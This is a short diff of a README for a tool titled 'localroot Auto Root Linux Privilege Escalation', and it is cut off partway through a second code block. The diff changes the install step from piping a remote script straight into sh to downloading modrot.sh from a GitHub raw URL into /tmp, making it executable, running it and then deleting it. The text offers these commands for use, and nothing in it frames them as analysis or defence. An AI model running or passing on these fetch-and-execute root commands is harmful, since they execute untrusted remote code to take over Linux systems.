@@ -1,7 +1,11 @@
 # localroot Auto Root Linux Privilege Escalation
 
 ```bash
-curl -L https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/modrot.sh | sh
+curl -L https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/modrot.sh -o /tmp/modrot.sh \
+&& dos2unix /tmp/modrot.sh \
+&& chmod +x /tmp/modrot.sh \
+&& /tmp/modrot.sh \
+&& rm -f /tmp/modrot.sh
 ```
 ```bash
 curl -L https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/modrot.sh -o /tmp/modrot.sh \
